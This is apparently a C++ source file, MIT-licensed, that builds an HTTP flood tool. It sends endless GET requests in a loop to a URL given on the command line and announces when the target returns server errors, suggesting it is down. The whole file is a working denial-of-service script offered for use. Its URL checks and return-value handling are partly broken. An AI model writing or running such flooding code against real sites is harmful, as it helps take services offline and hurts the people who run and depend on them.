#define CPPHTTPLIB_OPENSSL_SUPPORT
#include <iostream>
#include "httplib.h"
using namespace std;
#pragma comment(lib, "libcrypto")
#pragma comment(lib, "libssl")

int startflood(string url) {
    using namespace httplib;
    cout << "Beginning flood to \"" << url << "\"\n";
    long long int http_count = 0;
    Client request(url);
    while (true) {
        auto res = request.Get("/");
        if (res) {
            cout << "[" << res->status << "] ";
            int f_num = atoi(to_string(res->status).substr(0,1).c_str());
            if (f_num == 5) {
                cout << "Server error code! Check if the server is down now!";
            } else {
                cout << "Success code, server not down.";
            }
            cout << " (" << (http_count + 1) << ")\n";
        } else {
            cout << "Unexpected Error: " << res.error() << ", Exit_Code: 2\n";
            return 2;
        }
        http_count++;
    }
}

int main(int argc, char* argv[]) {
    string uri;
    if (argc <= 1) {
        cout << "Insufficient arguments";
        return 1;
    } else {
        uri.assign(argv[1]); 
    }
    try {
        string scheme = uri.substr(0,5);
        string scheme_https = scheme.substr((scheme.size() - 1),1);
        if (scheme.substr(0,4) != "http") {
            cout << "Not valid URL, try putting an URL like: 'http://website.tld' (without quotes), Exit_Code: 4";
            return 3;
        } else if (scheme == "http" || uri.substr(0,6) == "http:") {
            cout << "Not valid URL, try putting an URL like: 'http://website.tld' (without quotes), Exit_Code: 5";
            return 4;
        }
    } catch (...) {
        cout << "Put a valid URL first!, Exit_Code: 5";
        return 5;
    }
    int response = 0;
    if (!isdigit(startflood(uri)) || startflood(uri) != reinterpret_cast<int>(nullptr)) {
        response = 1;
    }
    return response;
}

/*
MIT License

Copyright (c) 2021 NK125

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
